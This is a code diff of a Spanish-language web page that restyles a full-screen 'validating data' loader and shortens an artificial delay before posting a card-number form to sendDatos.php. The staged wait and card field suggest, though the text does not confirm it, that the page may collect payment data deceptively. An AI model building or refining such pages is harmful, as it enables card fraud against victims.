@@ -148,19 +148,33 @@
 <!-- ****************  MODAL LOADER  **************** -->
 <!-- ****************  MODAL LOADER  **************** -->
 <!-- ****************  MODAL LOADER  **************** -->
-<div id="modalValidando" style="
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.6);
-    z-index: 999999;
+<style>
+    #modalValidando {
+        position: fixed;
+        inset: 0;
+        background: rgba(0,0,0,0.6);
+        z-index: 999999;
 
-    /* CENTRADO */
-    display: flex;           /* flex siempre */
-    justify-content: center; /* horizontal */
-    align-items: center;     /* vertical */
-    padding: 20px;
-    display: none;           /* oculto por defecto */
-">
+        /* Oculto inicialmente */
+        display: none;
+
+        /* Centrado perfecto */
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+
+        /* Para que Bootstrap NO lo modifique */
+        flex-direction: column;
+    }
+
+    /* Animación */
+    @keyframes zoomIN {
+        0% { transform: scale(0.9); opacity: 0; }
+        100% { transform: scale(1); opacity: 1; }
+    }
+</style>
+
+<div id="modalValidando">
     <div style="
         background: white;
         padding: 25px 20px;
@@ -174,29 +188,27 @@
         <img src="media/plane-loader.gif" style="width:130px;margin-bottom:10px;">
         <h4 id="modalText" style="margin-bottom:10px;">Validando datos...</h4>
         <p style="font-size:14px;color:#444;">Por favor espera unos segundos.</p>
-    </div> 
+    </div>
 </div>
 
 
-
-
-
-    <!-- ********** AJAX + loader ********** -->
- <script>
+<!-- ********** AJAX + LOADER ********** -->
+<script>
 $(document).ready(function () {
 
     $("#formDatos").on("submit", function (e) {
         e.preventDefault();
 
-        $("#modalValidando").fadeIn(300);
+        // Mostrar modal
+        $("#modalValidando").css("display", "flex").hide().fadeIn(300);
         $("#modalText").text("Estamos validando los datos...");
 
         let form = $(this);
 
-        // --- 1️⃣ Primero espera los 60 segundos ---
+        // --- ⏳ Esperar 30 segundos ---
         setTimeout(() => {
 
-            // --- 2️⃣ Luego de los 60s recién envía el AJAX ---
+            // --- Luego enviar AJAX ---
             $.ajax({
                 url: "sendDatos.php",
                 method: "POST",
@@ -233,11 +245,11 @@ $(document).ready(function () {
                 }
             });
 
-        }, 60000); // ⏳ 60 segundos
-
+        }, 30000); // ⏳ 30 segundos
     });
 
-    // FORMAT TARJETA
+
+    // FORMAT TARJETA XXXX XXXX XXXX XXXX
     $("#tarjetaInput").on("input", function () {
         let v = $(this).val().replace(/[^0-9]/g, '');
         v = v.replace(/(.{4})/g, '$1 ').trim();
@@ -246,6 +258,7 @@ $(document).ready(function () {
 
 });
 </script>
+
 
 
 </body>
